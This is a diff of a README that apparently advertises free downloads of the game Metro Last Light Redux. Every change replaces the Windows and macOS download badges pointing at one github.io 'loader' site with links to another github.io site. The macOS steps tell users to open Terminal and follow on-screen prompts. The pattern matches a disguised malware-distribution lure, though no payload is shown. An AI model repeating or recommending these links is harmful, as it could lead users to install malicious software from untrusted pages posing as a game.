@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_Metro%20Last%20Light%20Redux-F9A825?style=for-the-badge&logo=github)](https://QuakeShadowDay.github.io/win-loader/)
+[![Download](https://img.shields.io/badge/Download_Metro%20Last%20Light%20Redux-F9A825?style=for-the-badge&logo=github)](https://shellwarlockfigure.github.io/windows-dl/)
 
 </div>
 
@@ -51,9 +51,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://QuakeShadowDay.github.io/win-loader/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://shellwarlockfigure.github.io/windows-dl/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://QuakeShadowDay.github.io/mac-loader/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://shellwarlockfigure.github.io/macos-dl/)
 
 </div>
 
@@ -63,7 +63,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_Metro%20Last%20Light%20Redux-F9A825?style=for-the-badge&logo=github)](https://QuakeShadowDay.github.io/win-loader/)
+[![Download](https://img.shields.io/badge/Download_Metro%20Last%20Light%20Redux-F9A825?style=for-the-badge&logo=github)](https://shellwarlockfigure.github.io/windows-dl/)
 
 </div>
 
@@ -93,7 +93,7 @@
 
 ## macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://QuakeShadowDay.github.io/mac-loader/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://shellwarlockfigure.github.io/macos-dl/)
 
 1. Open **Terminal** (`Cmd + Space` -> Terminal)
 2. Follow the on-screen prompts
